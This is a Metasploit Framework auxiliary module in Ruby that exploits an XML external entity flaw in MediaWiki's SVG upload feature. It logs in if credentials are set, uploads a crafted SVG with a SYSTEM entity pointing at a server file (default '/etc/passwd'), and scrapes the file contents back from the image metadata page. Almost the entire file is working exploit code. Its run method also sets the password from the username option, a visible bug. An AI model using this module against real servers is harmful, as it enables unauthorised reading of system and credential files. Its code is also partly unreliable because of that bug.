##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit4 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::Scanner

	def initialize
		super(
			'Name'         => 'MediaWiki SVG XML Entity Expansion Remote File Access',
			'Description'  =>  %q{
					This module attempts to read a remote file from the server using a vulnerability
				in the way MediaWiki handles SVG files. The vulnerability occurs while trying to
				expand external entities with the SYSTEM identifier. In order to work MediaWiki must
				be configured to accept upload of SVG files. If anonymous uploads are allowed the
				username and password aren't required, otherwise they are. This module has been
				tested successfully on MediaWiki 1.19.4 and Ubuntu 10.04.
			},
			'References'   =>
				[
					[ 'OSVDB', '92490' ],
					[ 'URL', 'https://bugzilla.wikimedia.org/show_bug.cgi?id=46859' ],
					[ 'URL', 'http://www.gossamer-threads.com/lists/wiki/mediawiki-announce/350229']
				],
			'Author'       =>
				[
					'Daniel Franke', # Vulnerability discovery and PoC
					'juan vazquez'   # Metasploit module
				],
			'License'      => MSF_LICENSE
		)

		register_options(
		[
			Opt::RPORT(80),
			OptString.new('TARGETURI', [true, 'Path to MediaWiki', '/mediawiki']),
			OptString.new('RFILE', [true, 'Remote File', '/etc/passwd']),
			OptString.new('USERNAME', [ false,  "The user to authenticate as"]),
			OptString.new('PASSWORD', [ false,  "The password to authenticate with" ])
		], self.class)

		register_autofilter_ports([ 80 ])
		deregister_options('RHOST')
	end

	def rport
		datastore['RPORT']
	end

	def peer(rhost)
		"#{rhost}:#{rport}"
	end

	def get_first_session
		res = send_request_cgi({
			'uri'      => normalize_uri(target_uri.to_s, "index.php"),
			'method'   => 'GET',
			'vars_get' => {
				"title"    => "Special:UserLogin",
				"returnto" => "Main+Page"
			}
		})

		if res and res.code == 200 and res.headers['Set-Cookie'] and res.headers['Set-Cookie'] =~ /my_wiki_session=([a-f0-9]*)/
			return $1
		else
			return nil
		end
	end

	def get_login_token
		res = send_request_cgi({
			'uri'      => normalize_uri(target_uri.to_s, "index.php"),
			'method'   => 'GET',
			'vars_get' => {
				"title"    => "Special:UserLogin",
				"returnto" => "Main+Page"
			},
			'cookie' => "my_wiki_session=#{@first_session}"
		})

		if res and res.code == 200 and res.body =~ /name="wpLoginToken" value="([a-f0-9]*)"/
			return $1
		else
			return nil
		end

	end

	def parse_auth_cookie(cookies)
		cookies.split(";").each do |part|
			case part
				when /my_wikiUserID=(.*)/
					@wiki_user_id = $1
				when /my_wikiUserName=(.*)/
					@my_wiki_user_name = $1
				when /my_wiki_session=(.*)/
					@my_wiki_session = $1
				else
					next
			end
		end
	end

	def session_cookie
		if @user and @password
			return "my_wiki_session=#{@my_wiki_session}; my_wikiUserID=#{@wiki_user_id}; my_wikiUserName=#{@my_wiki_user_name}"
		else
			return "my_wiki_session=#{@first_session}"
		end
	end

	def authenticate
		res = send_request_cgi({
			'uri'      => normalize_uri(target_uri.to_s, "index.php"),
			'method'   => 'POST',
			'vars_get' => {
				"title"  => "Special:UserLogin",
				"action" => "submitlogin",
				"type"   => "login"
			},
			'vars_post' => {
				"wpName"         => datastore['USERNAME'],
				"wpPassword"     => datastore['PASSWORD'],
				"wpLoginAttempt" => "Log+in",
				"wpLoginToken"   => @login_token,
				"returnto"       => "Main+Page"
			},
			'cookie' => "my_wiki_session=#{@first_session}"
		})

		if res and res.code == 302 and res.headers['Set-Cookie'] =~ /my_wikiUserID/
			parse_auth_cookie(res.headers['Set-Cookie'])
			return true
		else
			return false
		end
	end

	def get_edit_token
		res = send_request_cgi({
			'uri'      => normalize_uri(target_uri.to_s, "index.php", "Special:Upload"),
			'method'   => 'GET',
			'cookie' => session_cookie
		})

		if res and res.code == 200 and res.body =~/<title>Upload file/ and res.body =~ /"editToken":"([0-9a-f]*)\+\\\\/
			return $1
		else
			return nil
		end

	end

	def upload_file

		entity = Rex::Text.rand_text_alpha_lower(3)
		@file_name = Rex::Text.rand_text_alpha_lower(4)
		svg_file = %Q|
		<!DOCTYPE svg [<!ENTITY #{entity} SYSTEM "file://#{datastore['RFILE']}">]>
		<svg xmlns="http://www.w3.org/2000/svg" version="1.1">
			<desc>&#{entity};</desc>
			<rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:1;stroke:rgb(0,0,0)" />
		</svg>
		|
		svg_file.gsub!(/\t\t/, "")

		post_data = Rex::MIME::Message.new
		post_data.add_part(svg_file, "image/svg+xml", nil, "form-data; name=\"wpUploadFile\"; filename=\"#{@file_name}.svg\"")
		post_data.add_part("#{@file_name.capitalize}.svg", nil, nil, "form-data; name=\"wpDestFile\"")
		post_data.add_part("", nil, nil, "form-data; name=\"wpUploadDescription\"")
		post_data.add_part("", nil, nil, "form-data; name=\"wpLicense\"")
		post_data.add_part("#{@edit_token}+\\", nil, nil, "form-data; name=\"wpEditToken\"")
		post_data.add_part("Special:Upload", nil, nil, "form-data; name=\"title\"")
		post_data.add_part("1", nil, nil, "form-data; name=\"wpDestFileWarningAck\"")
		post_data.add_part("Upload file", nil, nil, "form-data; name=\"wpUpload\"")

		# Work around an incompatible MIME implementation
		data = post_data.to_s
		data.gsub!(/\r\n\r\n--_Part/, "\r\n--_Part")

		res = send_request_cgi({
			'uri'      => normalize_uri(target_uri.to_s, "index.php", "Special:Upload"),
			'method'   => 'POST',
			'data'     => data,
			'ctype'  => "multipart/form-data; boundary=#{post_data.bound}",
			'cookie' => session_cookie
		})

		if res and res.code == 302 and res.headers['Location']
			return res.headers['Location']
		else
			return nil
		end
	end

	def read_data
		res = send_request_cgi({
			'uri'      => @svg_uri,
			'method'   => 'GET',
			'cookie' => session_cookie
		})

		if res and res.code == 200 and res.body =~ /File:#{@file_name.capitalize}.svg/ and res.body =~ /Metadata/ and res.body =~ /<th>Image title<\/th>\n<td>(.*)<\/td>\n<\/tr><\/table>/m
			return $1
		else
			return nil
		end
	end

	def accessfile(rhost)

		vprint_status("#{peer(rhost)} MediaWiki - Getting unauthenticated session...")
		@first_session = get_first_session
		if @first_session.nil?
			print_error("#{peer(rhost)} MediaWiki - Failed to get unauthenticated session...")
			return
		end

		if @user and not @user.empty? and @password and not @password.empty?
			vprint_status("#{peer(rhost)} MediaWiki - Getting login token...")
			@login_token = get_login_token
			if @login_token.nil?
				print_error("#{peer(rhost)} MediaWiki - Failed to get login token")
				return
			end

			if not authenticate
				print_error("#{peer(rhost)} MediaWiki - Failed to authenticate")
				return
			end
		end

		vprint_status("#{peer(rhost)} MediaWiki - Getting edit token...")
		@edit_token = get_edit_token
		if @edit_token.nil?
			print_error("#{peer(rhost)} MediaWiki - Failed to get edit token")
			return
		end

		vprint_status("#{peer(rhost)} MediaWiki - Uploading SVG file...")
		@svg_uri = upload_file
		if @svg_uri.nil?
			print_error("#{peer(rhost)} MediaWiki - Failed to upload SVG file")
			return
		end

		vprint_status("#{peer(rhost)} MediaWiki - Retrieving remote file...")
		loot = read_data
		if loot.nil? or loot.empty?
			print_error("#{peer(rhost)} MediaWiki - Failed to retrieve remote file")
			return
		end

		f = ::File.basename(datastore['RFILE'])
		path = store_loot('mediawiki.file', 'application/octet-stream', rhost, loot, f, datastore['RFILE'])
		print_status("#{peer(rhost)} MediaWiki - #{datastore['RFILE']} saved in #{path}")
	end

	def run
		@user = datastore['USERNAME']
		@password = datastore['USERNAME']
		super
	end

	def run_host(ip)
		accessfile(ip)
	end

end

